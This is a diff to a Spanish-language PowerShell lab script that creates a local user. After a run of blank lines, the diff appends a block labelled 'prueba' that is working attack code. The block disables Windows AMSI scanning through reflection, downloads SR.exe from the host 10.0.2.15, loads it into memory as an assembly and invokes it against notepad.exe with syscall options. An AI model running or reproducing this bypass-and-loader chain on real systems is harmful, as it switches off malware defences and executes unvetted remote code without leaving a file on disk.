@@ -37,3 +37,27 @@ New-LocalUser -Name "Labuser" -Password $Password -FullName "Usuario de Laborato
 
 # 3. Añadir el usuario al grupo
 Add-LocalGroupMember -Group "Usuarios" -Member "Labuser"
+
+
+
+
+prueba:
+# AMSI bypass
+$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*AmsiUtils" }
+$f = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
+$f.SetValue($null, [IntPtr]::Zero)
+
+# Descarga SRPI
+$url = "http://10.0.2.15/SR.exe"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+
+# Carga assembly
+$asm = [System.Reflection.Assembly]::Load($bytes)
+
+# Construye args de forma segura
+$srpiArgs = [string[]]@("-file", "C:\Windows\System32\notepad.exe", "-syscalls")
+$invokeParams = New-Object 'object[]' 1
+$invokeParams[0] = $srpiArgs
+
+# Invoca
+$asm.EntryPoint.Invoke($null, $invokeParams)
